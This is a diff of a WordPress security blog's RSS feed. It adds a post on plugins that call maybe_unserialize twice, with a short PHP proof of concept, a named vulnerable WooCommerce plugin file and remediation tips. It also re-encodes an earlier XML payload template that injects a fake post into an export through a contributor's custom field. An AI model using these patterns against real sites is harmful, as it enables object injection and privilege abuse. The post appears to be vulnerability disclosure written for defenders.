@@ -12,7 +12,7 @@
 	<atom:link href="https://wpdeeply.com/category/plugins/feed/" rel="self" type="application/rss+xml" />
 	<link>http://wpdeeply.com/</link>
 	<description></description>
-	<lastBuildDate>Sat, 25 Jul 2020 22:15:05 +0000</lastBuildDate>
+	<lastBuildDate>Mon, 27 Jul 2020 21:13:00 +0000</lastBuildDate>
 	<language>en-US</language>
 	<sy:updatePeriod>
 	hourly	</sy:updatePeriod>
@@ -20,6 +20,60 @@
 	1	</sy:updateFrequency>
 	<generator>https://wordpress.org/?v=5.4.2</generator>
 	<item>
+		<title>WordPress and multiple maybe_unserialize</title>
+		<link>https://wpdeeply.com/wordpress-and-multiple-maybe_unserialize/</link>
+		
+		<dc:creator><![CDATA[root]]></dc:creator>
+		<pubDate>Mon, 27 Jul 2020 21:12:58 +0000</pubDate>
+				<category><![CDATA[plugins]]></category>
+		<category><![CDATA[0day]]></category>
+		<guid isPermaLink="false">https://wpdeeply.com/?p=185</guid>
+
+					<description><![CDATA[WordPress introduced maybe_unserialize and maybe_serialize as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple maybe_unserialize towards values that could be planted into DB with lower number of maybe_serializecalls. Eli5 PoC and if you think that this code isn&#8217;t existing then [&#8230;]]]></description>
+										<content:encoded><![CDATA[
+<p>WordPress introduced <code>maybe_unserialize</code> and <code>maybe_serialize</code> as security functions in the past and they are deeply integrated in the core. Usually for backward compatibility or improper usage in the past, many software vendors are using multiple <code>maybe_unserialize</code> towards values that could be planted into DB with lower number of <code>maybe_serialize</code>calls.</p>
+
+
+
+<h2>Eli5 PoC</h2>
+
+
+
+<pre class="wp-block-code"><code lang="php" class="language-php">$maybe_double_unserialize = function ( $value ) {
+	return maybe_unserialize( $value );
+};
+
+$values = array_map(
+	$maybe_double_unserialize,
+	array_filter( get_post_meta( $product_id, $field_key ) )
+);
+</code></pre>
+
+
+
+<p>and if you think that this code isn&#8217;t existing then <a rel="noreferrer noopener" href="https://plugins.trac.wordpress.org/browser/woocommerce-multilingual/trunk/inc/translation-editor/class-wcml-editor-ui-product-job.php#L984" target="_blank">check this</a> out. Yes it is 100k active installs Woo plugin and when Woo unserialze attack is in question, <a rel="noreferrer noopener" href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank">then</a>! :/</p>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#few-facts"></a>Few facts</h2>
+
+
+
+<ul><li>dounble&nbsp;<code>maybe_unserialize</code>&nbsp;is quite widespread around WP eco system, specially in Woo related plugins</li></ul>
+
+
+
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-multiple-maybe-unserialize.md#remadiation"></a>Remadiation</h2>
+
+
+
+<ul><li>add constraints into your php.ini regarding serialization</li><li>mod the maybe_ functions so they sign the final payload</li></ul>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
 		<title>WordPress core and MySQL string comparison</title>
 		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
 		
@@ -154,39 +208,39 @@ add_action(init, "bypass_protected_meta");
 
 
 
-<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Template payload for meta value:</p>
+<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value 🙂 Template payload for meta value:</p>
 
 
 
-<pre class="wp-block-code"><code lang="xml" class="language-xml">&lt;/wp:meta_value>&lt;/wp:postmeta>&lt;/item>
+<pre class="wp-block-code"><code lang="xml" class="language-xml">&#x3C;/wp:meta_value&#x3E;&#x3C;/wp:postmeta&#x3E;&#x3C;/item&#x3E;
 [asciicontrol]
-&lt;item>
-&lt;title>Attack-Post-1337&lt;/title>
-&lt;link>http://attack.post/2020/07/19/attack-post/&lt;/link>
-&lt;pubDate>Sun, 19 Jul 2020 20:57:17 +0000&lt;/pubDate>
-&lt;dc:creator>attacker&lt;/dc:creator>
-&lt;guid isPermaLink="false">http://attack.post?p=1337&lt;/guid>
-&lt;description>&lt;/description>
-&lt;content:encoded>&lt;!-- wp:paragraph -->
-&lt;p>boom jee&lt;/p>
-&lt;!-- /wp:paragraph -->&lt;/content:encoded>
-&lt;excerpt:encoded>&lt;/excerpt:encoded>
-&lt;wp:post_id>1337&lt;/wp:post_id>
-&lt;wp:post_date>2020-07-19 20:57:17&lt;/wp:post_date>
-&lt;wp:post_date_gmt>2020-07-19 20:57:17&lt;/wp:post_date_gmt>
-&lt;wp:comment_status>open&lt;/wp:comment_status>
-&lt;wp:ping_status>open&lt;/wp:ping_status>
-&lt;wp:post_name>attack-post&lt;/wp:post_name>
-&lt;wp:status>publish&lt;/wp:status>
-&lt;wp:post_parent>0&lt;/wp:post_parent>
-&lt;wp:menu_order>0&lt;/wp:menu_order>
-&lt;wp:post_type>post&lt;/wp:post_type>
-&lt;wp:post_password>&lt;/wp:post_password>
-&lt;wp:is_sticky>0&lt;/wp:is_sticky>
-&lt;category domain="category" nicename="uncategorized">Uncategorized&lt;/category>
-&lt;wp:postmeta>
-&lt;wp:meta_key>_test&lt;/wp:meta_key>
-&lt;wp:meta_value></code></pre>
+&#x3C;item&#x3E;
+&#x3C;title&#x3E;Attack-Post-1337&#x3C;/title&#x3E;
+&#x3C;link&#x3E;http://attack.post/2020/07/19/attack-post/&#x3C;/link&#x3E;
+&#x3C;pubDate&#x3E;Sun, 19 Jul 2020 20:57:17 +0000&#x3C;/pubDate&#x3E;
+&#x3C;dc:creator&#x3E;attacker&#x3C;/dc:creator&#x3E;
+&#x3C;guid isPermaLink=&#x22;false&#x22;&#x3E;http://attack.post?p=1337&#x3C;/guid&#x3E;
+&#x3C;description&#x3E;&#x3C;/description&#x3E;
+&#x3C;content:encoded&#x3E;&#x3C;!-- wp:paragraph --&#x3E;
+&#x3C;p&#x3E;boom jee&#x3C;/p&#x3E;
+&#x3C;!-- /wp:paragraph --&#x3E;&#x3C;/content:encoded&#x3E;
+&#x3C;excerpt:encoded&#x3E;&#x3C;/excerpt:encoded&#x3E;
+&#x3C;wp:post_id&#x3E;1337&#x3C;/wp:post_id&#x3E;
+&#x3C;wp:post_date&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date&#x3E;
+&#x3C;wp:post_date_gmt&#x3E;2020-07-19 20:57:17&#x3C;/wp:post_date_gmt&#x3E;
+&#x3C;wp:comment_status&#x3E;open&#x3C;/wp:comment_status&#x3E;
+&#x3C;wp:ping_status&#x3E;open&#x3C;/wp:ping_status&#x3E;
+&#x3C;wp:post_name&#x3E;attack-post&#x3C;/wp:post_name&#x3E;
+&#x3C;wp:status&#x3E;publish&#x3C;/wp:status&#x3E;
+&#x3C;wp:post_parent&#x3E;0&#x3C;/wp:post_parent&#x3E;
+&#x3C;wp:menu_order&#x3E;0&#x3C;/wp:menu_order&#x3E;
+&#x3C;wp:post_type&#x3E;post&#x3C;/wp:post_type&#x3E;
+&#x3C;wp:post_password&#x3E;&#x3C;/wp:post_password&#x3E;
+&#x3C;wp:is_sticky&#x3E;0&#x3C;/wp:is_sticky&#x3E;
+&#x3C;category domain=&#x22;category&#x22; nicename=&#x22;uncategorized&#x22;&#x3E;Uncategorized&#x3C;/category&#x3E;
+&#x3C;wp:postmeta&#x3E;
+&#x3C;wp:meta_key&#x3E;_test&#x3C;/wp:meta_key&#x3E;
+&#x3C;wp:meta_value&#x3E;</code></pre>
 
 
 
